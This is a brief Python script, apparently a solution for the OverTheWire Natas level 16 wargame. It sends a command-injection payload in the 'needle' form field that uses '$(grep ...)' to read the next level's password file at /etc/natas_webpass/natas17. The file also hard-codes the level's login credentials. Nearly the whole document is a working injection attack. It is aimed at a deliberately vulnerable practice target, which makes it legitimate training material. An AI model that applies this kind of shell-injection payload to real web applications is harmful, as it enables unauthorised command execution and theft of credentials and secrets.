#!/usr/bin/env python3
import requests

password = list("b")
endIndex = 0
usernm = "natas16"
passwd = "hPkjKYviLQctEW33QmuXL6eDVfMW4sGo"
url = "http://natas16.natas.labs.overthewire.org"
session = requests.Session()

print(f"Trying: {"".join(password)}")
res = session.post(url, data={"needle":'$(grep ' + "".join(password) + ' /etc/natas_webpass/natas17'+')', "submit":"Search"}, auth = (usernm, passwd))
print(res.text)


